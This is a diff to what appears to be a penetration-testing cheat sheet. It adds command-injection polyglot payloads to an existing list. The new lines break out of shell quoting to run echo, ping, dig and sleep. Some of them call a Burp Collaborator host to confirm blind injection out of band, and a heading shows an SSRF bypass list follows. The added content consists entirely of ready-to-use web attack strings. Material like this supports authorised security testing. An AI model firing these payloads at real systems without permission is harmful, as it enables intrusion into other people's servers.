@@ -146,6 +146,11 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 ```
 /*$(ping -c 2 example.com)`ping -c 2 example.com``*/-ping -c 2 example.com-'/*$(ping -c 2 example.com)`ping -c 2 example.com` #*/-ping -c 2 example.com||'"||ping -c 2 example.com||"/*`*/
 /*$(echo 1 >/tmp/rce1)`echo 1 >/tmp/rce1``*/-echo 1 >/tmp/rce1-'/*$(echo 1 >/tmp/rce1)`echo 1 >/tmp/rce1` #*/-echo 1 >/tmp/rce1||'"||echo 1 >/tmp/rce1||"/*`*/
+|echo lol2137||a #' |echo lol2137||a #|" |echo lol2137||a #
+||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+||`ping -c 21 grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net` #' |ping -n 21 grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net||`ping -c 21 grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net` #\" |ping -n 21 grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net
+||`dig grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net` #' |dig grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net||`dig grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net` #\" |dig grb0fhwh3gg8b9g0nbeqddobp2vsjh.burpcollaborator.net
+$(sleep 21)
 ```
 # SSRF Bypass list for localhost (127.0.0.1):
 ```
